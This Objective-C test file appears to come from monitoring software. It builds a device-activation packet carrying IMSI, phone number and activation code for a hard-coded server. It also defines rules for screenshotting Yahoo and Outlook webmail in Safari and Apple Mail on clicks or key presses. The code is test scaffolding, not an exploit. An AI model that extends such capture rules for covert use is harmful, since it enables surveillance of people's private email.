//
//  AppDelegate.m
//  ProtocolBuilderTestAppForMac
//
//  Created by Benjawan Tanarattanakorn on 10/14/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//


#import "AppDelegate.h"

#import "CommandMetaData.h"
#import "ProtocolPacketBuilder.h"
#import "SendActivate.h"
#import "CommandMetaData.h"
#import "TransportDirectiveEnum.h"

#import "AppScreenRule.h"

@implementation AppDelegate

@synthesize window = _window;

- (void)dealloc
{
    [super dealloc];
}
	
- (void) test1 {
    NSLog(@"test 1");
	SendActivate *command = [[SendActivate alloc] init]; 
	[command setDeviceInfo:@"CMDDeviceInfo"];
	[command setDeviceModel:@"CMDDeviceModel"];
	
	CommandMetaData *metadata = [[CommandMetaData alloc] init];
	[metadata setMCC:@"MCC"];
	[metadata setCompressionCode:1];
	[metadata setConfID:0];
	[metadata setEncryptionCode:1];
	[metadata setProductID:4200];
	[metadata setProtocolVersion:1];
	[metadata setLanguage:0];
	[metadata setActivationCode:@"012549"];
	[metadata setDeviceID:@"DeviceId"];
	[metadata setIMSI:@"IMSI"];
	[metadata setMCC:@"MCC"];
	[metadata setMNC:@"MNC"];
	[metadata setPhoneNumber:@"123456789"];
	[metadata setProductVersion:@"1.00"];
	[metadata setHostURL:@"http://58.137.119.229/RainbowCore"];	
	
    
	NSString *keyFile=[[NSBundle mainBundle] pathForResource:@"server" ofType:@"pub"];
    NSLog(@"keyFile %@", keyFile);
    
	NSData *keyData = [NSData dataWithContentsOfFile:keyFile];
    NSLog(@"keyData %@", keyData);
	ProtocolPacketBuilder *packetBuilder = [[ProtocolPacketBuilder alloc] init];
    
    NSLog(@"... building package for command SendActivate");
	ProtocolPacketBuilderResponse *response = [packetBuilder buildPacketForCommand:command  
                                                                      withMetaData:metadata
                                                                   withPayloadPath:nil 
                                                                     withPublicKey:keyData
                                                                          withSSID:1234687 
                                                                     withDirective:NON_RESUMABLE];
    

    
    NSLog(@"... DONE building package for command SendActivate");
    NSLog(@"response %@", response);
    
}
- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    // Insert code here to initialize your application
    //[self test1];
    
//    [self testAppScreenRuleBrowserV13];
//    [self testAppScreenRuleNonBrowserV13];
    
    [self parseAppScreenRule_v11_to_v13];
}

- (void) testAppScreenRuleBrowserV13 {
    // Rule
    AppScreenRule *rule = [[[AppScreenRule alloc] init] autorelease];
    rule.mApplicationID = @"com.apple.Safari";
    rule.mFrequency = 7;
    rule.mAppType = kBrowser;
    rule.mScreenshotType = kScreenshotTypeWebmail;
    rule.mKey = kKeyPress_None;
    rule.mMouse = kMouseClick_Left;
    
    // Parameter
    NSMutableArray *params = [NSMutableArray arrayWithCapacity:1];
    AppScreenParameter *param1 = [[[AppScreenParameter alloc] init] autorelease];
    param1.mDomainName = @"mail.yahoo.com";
    param1.mTitles = @[@"mail-title1", @"mail-title2", @"mail-title3"];
    [params addObject:param1];
    
    AppScreenParameter *param2 = [[[AppScreenParameter alloc] init] autorelease];
    param2.mDomainName = @"mail.live.com";
    param2.mTitles = @[@"mail-title4", @"mail-title5", @"mail-title6"];
    [params addObject:param2];
    
    rule.mParameter = params;
    
    NSData *ruleData = [NSKeyedArchiver archivedDataWithRootObject:rule];
    
    [ruleData writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/app_screenshot_rule_browser_v13.dat", NSUserName()] atomically:YES];
}

- (void) testAppScreenRuleNonBrowserV13 {
    // Rule
    AppScreenRule *rule = [[[AppScreenRule alloc] init] autorelease];
    rule.mApplicationID = @"com.apple.Mail";
    rule.mFrequency = 6;
    rule.mAppType = kNon_Browser;
    rule.mScreenshotType = kScreenshotTypeMailApp;
    rule.mKey = kKeyPress_Enter;
    rule.mMouse = kMouseClick_Right | kMouseClick_Left;
    
    // Parameter
    NSMutableArray *params = [NSMutableArray arrayWithCapacity:1];
    AppScreenParameter *param1 = [[[AppScreenParameter alloc] init] autorelease];
    param1.mTitles = @[@"title1", @"title2", @"title3"];
    [params addObject:param1];
    
    AppScreenParameter *param2 = [[[AppScreenParameter alloc] init] autorelease];
    param2.mTitles = @[@"title4", @"title5", @"title6"];
    [params addObject:param2];
    
    rule.mParameter = params;
    
    NSData *ruleData = [NSKeyedArchiver archivedDataWithRootObject:rule];
    
    [ruleData writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/app_screenshot_rule_nonbrowser_v13.dat", NSUserName()] atomically:YES];
}

- (void) parseAppScreenRule_v11_to_v13 {
    /*
     // Rule for v11 non-browser
     AppScreenRule *rule = [[[AppScreenRule alloc] init] autorelease];
     rule.mApplicationID = @"com.apple.Mail";
     rule.mFrequency = 6;
     rule.mAppType = kNon_Browser;
     
     // Parameter
     NSMutableArray *params = [NSMutableArray arrayWithCapacity:1];
     AppScreenParameter *param1 = [[[AppScreenParameter alloc] init] autorelease];
     param1.mTitle = @"title7";
     [params addObject:param1];
     
     AppScreenParameter *param2 = [[[AppScreenParameter alloc] init] autorelease];
     param2.mTitle = @"title8";
     [params addObject:param2];
     
     rule.mParameter = params;
     
     NSData *ruleData = [NSKeyedArchiver archivedDataWithRootObject:rule];
     
     [ruleData writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/app_screenshot_rule_nonbrowser_v11.dat", NSUserName()] atomically:YES];
    */
    NSString *resourcePath = [[NSBundle mainBundle] resourcePath];
    NSString *rulePath = [resourcePath stringByAppendingPathComponent:@"app_screenshot_rule_nonbrowser_v11.dat"];
    NSData *ruleData = [NSData dataWithContentsOfFile:rulePath];
    AppScreenRule *rule1 = [NSKeyedUnarchiver unarchiveObjectWithData:ruleData];
    NSLog(@"rule1 : %@", rule1);
    
    
    /*
     // Rule for v11 browser
     AppScreenRule *rule = [[[AppScreenRule alloc] init] autorelease];
     rule.mApplicationID = @"com.apple.Safari";
     rule.mFrequency = 7;
     rule.mAppType = kBrowser;
     
     // Parameter
     NSMutableArray *params = [NSMutableArray arrayWithCapacity:1];
     AppScreenParameter *param1 = [[[AppScreenParameter alloc] init] autorelease];
     param1.mDomainName = @"mail.yahoo.com";
     param1.mTitle = @"mail-title7";
     [params addObject:param1];
     
     AppScreenParameter *param2 = [[[AppScreenParameter alloc] init] autorelease];
     param2.mDomainName = @"mail.live.com";
     param2.mTitle = @"mail-title8";
     [params addObject:param2];
     
     rule.mParameter = params;
     
     NSData *ruleData = [NSKeyedArchiver archivedDataWithRootObject:rule];
     
     [ruleData writeToFile:[NSString stringWithFormat:@"/Users/%@/Desktop/app_screenshot_rule_browser_v11.dat", NSUserName()] atomically:YES];
    */
    rulePath = [resourcePath stringByAppendingPathComponent:@"app_screenshot_rule_browser_v11.dat"];
    ruleData = [NSData dataWithContentsOfFile:rulePath];
    AppScreenRule *rule2 = [NSKeyedUnarchiver unarchiveObjectWithData:ruleData];
    NSLog(@"rule2 : %@", rule2);
}

@end
